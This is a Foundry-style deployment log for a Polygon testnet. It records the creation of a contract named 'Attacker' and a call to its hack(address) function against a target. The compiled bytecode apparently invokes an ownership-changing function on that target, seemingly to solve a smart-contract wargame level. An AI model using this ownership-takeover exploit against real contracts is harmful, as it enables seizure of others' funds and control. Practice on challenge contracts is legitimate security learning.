{
  "transactions": [
    {
      "hash": "0xad013749833d8ce15b0314189b6799c3b3985c307d780542e16191cbd805343e",
      "transactionType": "CREATE",
      "contractName": "Attacker",
      "contractAddress": "0x4A3c50BA5b65F32cC04f38a865C192b4Ae431F2a",
      "function": null,
      "arguments": null,
      "transaction": {
        "type": "0x02",
        "from": "0x64cbc2b36fd9dd66fe016181fabf30167a3818b2",
        "gas": "0x2236a",
        "value": "0x0",
        "data": "0x608060405234801561001057600080fd5b5060fc8061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80636c4c174f14602d575b600080fd5b603c60383660046098565b603e565b005b60405163a6f9dae160e01b81523360048201526001600160a01b0382169063a6f9dae190602401600060405180830381600087803b158015607e57600080fd5b505af11580156091573d6000803e3d6000fd5b5050505050565b60006020828403121560a957600080fd5b81356001600160a01b038116811460bf57600080fd5b939250505056fea26469706673582212207d1d4701a26365029e458be6ec67812df05e4714968dcbcdc5f43198ec864f5464736f6c63430008120033",
        "nonce": "0x23",
        "accessList": []
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x9ebebd166492a60d48fc9f533b4f35f87cb02c875d4578724c238cb8c47e3100",
      "transactionType": "CALL",
      "contractName": "Attacker",
      "contractAddress": "0x4A3c50BA5b65F32cC04f38a865C192b4Ae431F2a",
      "function": "hack(address)",
      "arguments": [
        "0x75919D579DF08df8345A1C9584a46054EFF54d44"
      ],
      "transaction": {
        "type": "0x02",
        "from": "0x64cbc2b36fd9dd66fe016181fabf30167a3818b2",
        "to": "0x4a3c50ba5b65f32cc04f38a865c192b4ae431f2a",
        "gas": "0xa110",
        "value": "0x0",
        "data": "0x6c4c174f00000000000000000000000075919d579df08df8345a1c9584a46054eff54d44",
        "nonce": "0x24",
        "accessList": []
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [],
  "libraries": [],
  "pending": [
    "0xad013749833d8ce15b0314189b6799c3b3985c307d780542e16191cbd805343e",
    "0x9ebebd166492a60d48fc9f533b4f35f87cb02c875d4578724c238cb8c47e3100"
  ],
  "returns": {},
  "timestamp": 1685221862,
  "chain": 80001,
  "multi": false,
  "commit": "f4cfccc"
}